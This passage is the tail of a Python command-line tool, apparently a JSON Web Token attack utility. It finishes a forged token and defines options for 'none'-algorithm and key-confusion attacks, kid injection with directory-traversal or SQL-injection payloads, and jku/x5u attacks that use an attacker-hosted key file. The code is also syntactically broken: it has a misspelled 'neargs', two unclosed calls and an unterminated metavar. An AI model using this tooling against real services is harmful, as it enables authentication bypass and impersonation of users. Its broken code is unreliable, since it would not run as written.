            sys.exit(2)
        header, payload = self.modify_header_and_payload()
        new_partial_token = Cracker.craft_token(header, payload)
        signature = self.select_signature(new_partial_token)
        final_token = new_partial_token + "." + signature
        print(f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}")
        print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
        # print(final_token.split(".")[0] == self.token_dict['header'], final_token.split(".")[1] == self.token_dict['payload'])	# DEBUG
        if self.file is not None:
            self.file.close()
        if os.path.exists("key.pem"):
            os.remove("key.pem")
        if os.path.exists("cert.pem"):
            os.remove("cert.pem")
        if os.path.exists("testing.crt"):
            os.remove("testing.crt")
        self.devnull.close()
        sys.exit(0)


if __name__ == '__main__':

    # Initialize the parser
    parser = argparse.ArgumentParser(
        usage=Cracker.usage,
        description=Cracker.description,
        formatter_class=argparse.RawTextHelpFormatter
    )

    # Add the arguments
    parser.add_argument(
                        "token",
                        help="Your JWT"
                        )
    parser.add_argument("-a", "--alg",
                        help="The algorithm for the attack (None, none, HS256, RS256)",
                        metavar="<algorithm>", required=False
                        )
    parser.add_argument("-k", "--key",
                        help="The path to the public key file",
                        metavar="<path_to_key>", required=False
                        )
    parser.add_argument("-p", "--payload",
                        action="append", nargs="*",
                        help="The field you want to change in the payload as key:value pairs",
                        metavar="<key>:<value>", required=False
                        )
    parser.add_argument("-d", "--decode", action="store_true",
                        help="Just decode the token and quit.",
                        required=False
                        )
    parser.add_argument("--remove-from", action="append", nargs="*",
                        help="The section of the token, and the key name to delete as key:value pairs",
                        metavar="<section>:<key>", required=False,
                        )
    parser.add_argument("--add-into", action="append", neargs="*",
                        help="The section of the token, and the key name to add as key:value pairs",
                        metavar="<section>:<key>", required=False
    parser.add_argument("--unverified", action="store_true",
                        help="Treat the host as it doesn't verify the signature",
                        required=False
                        )
    parser.add_argument("--auto-try",
                        help="Try to use a key retrieved from the host ssl certs",
                        metavar="<domain>", required=False
                        )
    parser.add_argument("--inject-kid",
                        help="Try for kid injection. Choose a valid payload (DirTrv, SQLi)",
                        metavar="<payload>", required=False
                        )
    parser.add_argument("--specify-key",
                        help="Specify a string to use as key", metavar="<key>",
                        required=False
                        )
    parser.add_argument("--jku-basic",
                        help="Specify your ip or domain to host the jwks.json file",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--jku-redirect",
                        help="Specify the url with a redirect to the host where jwks.json file will be hosted",
                        metavar="<mainURL,yourURL>", required=False
                        )
    parser.add_argument("--jku-body",
                        help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
                        metavar="<mainURL>", required=False
                        )
    parser.add_argument("--x5u-basic",
                        help="Specify your ip or domain to host the jwks.json file",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--x5u-body",
                        help="Specify the url vulnerable to header injection, use the HERE keyword to tell the tool where to inject",
                        metavar="<mainURL", required=False
    parser.add_argument("--manual", action="store_true",
                        help="Specify this flag with jku/x5u basic if you need to craft an url without the tool appending or replaceing anything to it",
                        required=False
                        )

    # Parse arguments
    args = parser.parse_args()

    cracker = Cracker(
        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.specify_key,
        args.jku_basic, args.jku_redirect, args.jku_body, args.x5u_basic, args.x5u_body, args.unverified, args.decode, args.manual
    )
    # print(args.payload)	# DEBUG
    # print(cracker.key)	# DEBUG
    cracker.run()

